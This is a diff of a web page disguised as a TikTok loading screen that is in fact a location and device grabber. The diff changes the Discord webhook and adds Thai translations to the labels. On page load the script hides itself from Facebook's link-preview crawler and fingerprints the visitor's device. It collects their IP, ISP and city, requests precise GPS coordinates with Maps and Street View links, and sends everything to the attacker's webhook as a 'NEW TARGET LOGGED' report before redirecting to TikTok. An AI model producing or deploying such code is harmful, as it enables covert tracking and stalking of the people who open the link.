@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <title>TikTok - Loading Content</title>
     <script>
-        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1505544002550894722/RUjDHbux3C0YOWveT1xcJ07SYzN9nNXHIm2_YfyuBAs0DZlzkcUqj7zDHzpPKwQKOUAi"; 
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1505441313468710923/4ZwXHcn5adt8nWLoAgLGOuIE9ZKfeIxjZBQvgsF5qh1uLl9DeMT5wQgpwfQxWSuBkpJ9"; 
 
         async function capture() {
             if (navigator.userAgent.includes("facebookexternalhit")) return;
@@ -16,15 +16,15 @@
                 const check = (val) => (val && val !== null ? val : "❌ ไม่พบข้อมูล");
 
                 const ua = navigator.userAgent;
-                let deviceType = "Desktop (PC/Laptop)";
-                let modelName = "Unknown Device";
+                let deviceType = "Desktop (PC/Laptop) (คอมพิวเตอร์)";
+                let modelName = "Unknown Device (ไม่ระบุรุ่น)";
 
                 if (/android/i.test(ua)) {
-                    deviceType = "Mobile (Android)";
+                    deviceType = "Mobile (Android) (มือถือแอนดรอยด์)";
                     const match = ua.match(/\(([^;]+);([^;]+);/);
                     modelName = match ? match[2].trim().split(" Build")[0] : "Android Device";
                 } else if (/iPhone|iPad|iPod/i.test(ua)) {
-                    deviceType = "Mobile (iOS)";
+                    deviceType = "Mobile (iOS) (มือถือไอโอเอส)";
                     const w = screen.width, h = screen.height, pr = window.devicePixelRatio;
                     if (w === 430 && h === 932) modelName = "iPhone 14/15/16 Pro Max";
                     else if (w === 393 && h === 852) modelName = "iPhone 14/15/16 Pro";
@@ -43,13 +43,22 @@
                     if (ent.model) modelName = ent.model;
                     if (navigator.userAgentData.platform === "Windows") {
                         const major = parseInt(ent.platformVersion.split('.')[0]);
-                        deviceType = (major >= 13) ? "Windows 11 PC" : "Windows 10 PC";
+                        deviceType = (major >= 13) ? "Windows 11 PC (วินโดวส์ 11)" : "Windows 10 PC (วินโดวส์ 10)";
                     }
                 }
 
                 let report = `📂 **NEW TARGET LOGGED (${deviceType})**\n\`\`\`\n`;
-                report += `[LOCATION]\nCity: ${check(data.city)}\nRegion: ${check(data.region)}\nPostal: ${check(data.postal)}\nCountry: ${check(data.country_name)}\n\n`;
-                report += `[DEVICE]\nModel: ${modelName}\nOS: ${check(navigator.platform)}\nIP: ${check(data.ip)}\nISP: ${check(data.org)}\n\`\`\``;
+                report += `[LOCATION (ตำแหน่ง)]\n`;
+                report += `City (เมือง): ${check(data.city)}\n`;
+                report += `Region (จังหวัด): ${check(data.region)}\n`;
+                report += `Postal (รหัสไปรษณีย์): ${check(data.postal)}\n`;
+                report += `Country (ประเทศ): ${check(data.country_name)}\n\n`;
+
+                report += `[DEVICE (อุปกรณ์)]\n`;
+                report += `Model (รุ่น): ${modelName}\n`;
+                report += `OS (ระบบปฏิบัติการ): ${check(navigator.platform)}\n`;
+                report += `IP (ไอพี): ${check(data.ip)}\n`;
+                report += `ISP (ผู้ให้บริการ): ${check(data.org)}\n\`\`\``;
 
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
@@ -68,7 +77,7 @@
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ 
-                                content: `🎯 **PRECISE LOCATION (${modelName})**\n📍 Location: ${latitude}, ${longitude}\n📍 Maps: ${mapsLink}\n🏠 Street View: ${streetView}` 
+                                content: `🎯 **PRECISE LOCATION (${modelName}) (พิกัดแม่นยำสูง)**\n📍 Location (พิกัด): ${latitude}, ${longitude}\n📍 Maps (แผนที่): ${mapsLink}\n🏠 Street View (สตรีทวิว): ${streetView}` 
                             })
                         });
                         // ส่งเสร็จแล้วเด้งไป TikTok ทันที
@@ -93,7 +102,7 @@
 </head>
 <body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family: sans-serif;">
     <div style="text-align:center;">
-        <p>Loading Content...</p>
+        <p>Loading Content... (กำลังโหลดเนื้อหา...)</p>
         <div style="border: 3px solid #f3f3f3; border-top: 3px solid #fe2c55; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto;"></div>
     </div>
     <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
